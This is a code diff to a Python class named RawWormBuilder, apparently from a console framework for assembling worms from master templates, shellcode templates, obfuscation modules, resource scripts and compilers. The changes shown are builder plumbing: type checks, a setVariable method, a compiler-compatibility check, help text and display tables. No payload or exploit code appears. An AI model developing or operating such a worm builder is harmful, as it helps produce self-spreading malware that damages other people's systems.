@@ -82,6 +82,9 @@ class RawWormBuilder:
         if not self.RAW.master_worm and raw_info.itemType != "worm":
             self.msg("error", "[!!] ERROR: First you need add worm (Master Template Worm) [!!]", sender=self.name)
             return
+        if raw_info.itemType == "support":
+            self.msg("error", "[!!] You can't add this type of module. It's managed by the worm. [!!]", sender=self.name)
+            return
         match raw_info.itemType:
             case "worm":
                 self.addMasterWorm(raw_info)
@@ -126,18 +129,7 @@ class RawWormBuilder:
                 self.msg("msg", f"Remove {child} module: {module.name} successfull.", sender=self.name)
             case "shadow":
                 del self.RAW.shadow[module.name]
-                self.msg("msg", f"Remove {child} shadow: {module.name} successfull.", sender=self.name)
-            # case "payload":
-            #     print(module.owner.payloadSpace)
-            #     print(self.RAW._payloads)
-            #     try:
-            #         # del module.owner.payloadSpace[]
-            #         del self.RAW._payloads[module.owner]
-            #         self.msg("msg", f"Remove {child} payload: {module.name} successfull.", sender=self.name)
-            #     except:
-            #         print("ERRR")
-            #         pass
-                
+                self.msg("msg", f"Remove {child} shadow: {module.name} successfull.", sender=self.name)              
             case "compiler":
                 self.RAW.master_compiler = None
                 self.msg("msg", f"Remove {child} compiler: {module.name} successfull.", sender=self.name)
@@ -289,6 +281,14 @@ class RawWormBuilder:
         owner = owner.owner
         self.addFood(var_name, food_name, owner)
     
+    def setVariable(self, var_name: str, value: any, val_type: str = "str") -> None:
+        var = self.RAW.variables.get(var_name)
+        if not var:
+            self.msg("error", f"[!!] ERROR: Variable {var_name} does not exists. [!!]", sender=self.name)
+            return
+        var.set_value(value, val_type)
+        self.msg("msg", f"Set variable: '{var_name}' successfull.", sender=self.name)
+    
     def addShadow(self, raw_info: object, target: Union[str, object, None]) -> None:
         if not target:
             target = self.RAW.master_worm
@@ -323,7 +323,7 @@ class RawWormBuilder:
         self.msg("msg", f"Add shellcode template: {scode.name} successfull.", sender=self.name)
         self.check_depediences(scode)
     
-    def addResourcesScript(self, raw_info: object, target: Union[str, object, None]) -> None:
+    def addResourcesScript(self, raw_info: object, target: Union[str, object, None], force_add: bool = False) -> None:
         if not target:
             if not self.RAW.master_compiler:
                 self.msg("error", "[!!] ERROR: To add Resource Script you must have a compiler added. [!!]", sender=self.name)
@@ -334,6 +334,10 @@ class RawWormBuilder:
         if not target:
             self.msg("error", f"[!!] ERROR: Target module does not exists in worm. [!!]", sender=self.name)
             return
+        if not force_add:
+            if not self.check_compatibility(raw_info, target):
+                self.msg("error", f"[!!] ERROR: Rscript is not compatibility with compiler.")
+                return
         rcscript = self.raw_constructor.buildRawItem(raw_info)
         rcscript.owner = target
         rcscript.setCompilerOwner(target)
@@ -429,6 +433,9 @@ class RawWormBuilder:
         self.msg("msg", "<< sM >> - Support Module. 'Support Module' are added automatically by worm constructor.", sender=self.name, no_separator=True)
         self.msg("msg", "<< PY_MOD >> - A Python code module. Most often included with the main code.", sender=self.name, no_separator=True)
         self.msg("msg", "<< SCode >> - Shellcode template.", sender=self.name, no_separator=True)
+        self.msg("msg", "<< PySM >> - A module written in Python containing standard libraries.", sender=self.name, no_separator=True)
+        self.msg("msg", "<< PyExM >> - Module written in Python requiring additional libraries from PIP.", sender=self.name, no_separator=True)
+        self.msg("msg", "<< PySh >> - Python code obfuscation.", sender=self.name, no_separator=True)
         
     def correct_tags(self, tag_list: list) -> str:
         tag = ""
@@ -450,11 +457,18 @@ class RawWormBuilder:
             mcompiler = "NOT LOADED"
         else:
             mcompiler = f'{self.RAW.master_compiler.name} - {self.RAW.master_compiler.info}'
+        accept_types = self.RAW.acceptItemList
+        if len(accept_types) == 0:
+            accept_types = "Worm does not allow adding any modules."
+        else:
+            accept_types = self.correct_tags(accept_types)
         tab["data"].append(["Worm Name:", self.wormName])
         tab["data"].append(["Source Lang:", self.RAW.master_worm.lang])
         tab["data"].append(["Master Template:", self.RAW.master_worm.name])
         tab["data"].append(["Description: ", self.RAW.master_worm.info])
-        tab["data"].append(["Worm Tags:", self.correct_tags(self.RAW.master_worm.moduleTags)])
+        # tab["data"].append(["Worm Tags:", self.correct_tags(self.RAW.master_worm.moduleTags)])
+        tab["data"].append(["Worm Tags:", self.correct_tags(self.RAW.tagsInfo)])
+        tab["data"].append(["Accepted Items:", accept_types])
         tab["data"].append(["Worm Process:", wprocess])
         tab["data"].append(["Worm Compiler:", mcompiler])
         tab["width"] = self.CONSOLE_SCR["2c"]
@@ -553,5 +567,25 @@ class RawWormBuilder:
         self.showVariables(True)
         self.showRcScript(True)
         self.showProcessWorm(True)
-
+    
+    def showWormComp(self, options: list) -> None:
+        show = []
+        if "info" in options:
+            show.append(self.showInfo)
+        if not self.RAW.master_worm:
+            if len(show) == 0:
+                self.msg("msg", "[!!] Worm is empty [!!]", sender=self.name)
+                return
+            else:
+                show[0]()
         
+
+    def showIconList(self) -> None:
+        self.msg("msg", f"  Icon list:  ", mtypes="title", sender=self.name, color=self.DEFAULT_TITLE_COLOR)
+        tab = {}
+        tab["headers"] = ["Icon Name:", "Size:"]
+        tab["data"] = []
+        for icon in self.Icons.get_info():
+            tab["data"].append([icon[0], icon[1]])
+        tab["width"] = self.CONSOLE_SCR["2c"]
+        self.msg("msg", tab, mtypes="table", no_separator=True, sender=self.name)
